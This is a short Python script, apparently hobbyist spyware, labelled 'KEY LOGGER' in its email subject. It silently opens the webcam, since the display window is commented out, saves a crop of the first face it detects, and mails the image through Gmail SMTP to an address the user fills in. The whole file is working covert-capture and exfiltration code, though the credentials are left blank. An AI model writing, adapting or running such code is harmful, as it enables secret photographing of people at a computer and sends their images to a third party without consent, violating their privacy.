import numpy as np 
import cv2
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


face_cascade = cv2.CascadeClassifier('C:/Users/Admin/Desktop/New folder (5)/cascades/data/haarcascade_frontalface_default.xml')
cap = cv2.VideoCapture(0)
#face iden (chỉ nhận diện khi mặt ở khung hình)
a = 0

while(True):
	

	ret , frame = cap.read()
	gray = cv2.cvtColor(frame,cv2.COLOR_BGR2GRAY)

	faces = face_cascade.detectMultiScale(gray, scaleFactor=1.5, minNeighbors=5)

	for (x,y,w,h) in faces : 
		a+=1
		print(x,y,w,h)
		roi_gray =gray[y:y+h,x:x+w]
		roi_color = frame[y:y+h,x:x+w]
		img_item = "face.jpg"
		cv2.imwrite(img_item,roi_color)
	#cv2.imshow("frame",frame)
	if a == 1: break
	
	
	
	
	

	
	 
		 
	

cap.release()
cv2.destroyAllWindows()

#send mail







email_user = '' #your email
email_password = '' #your email password
email_send = '' #email you want to send

subject = 'KEY LOGGER' 

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Keylogger'
msg.attach(MIMEText(body,'plain'))

filename='face.jpg'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()

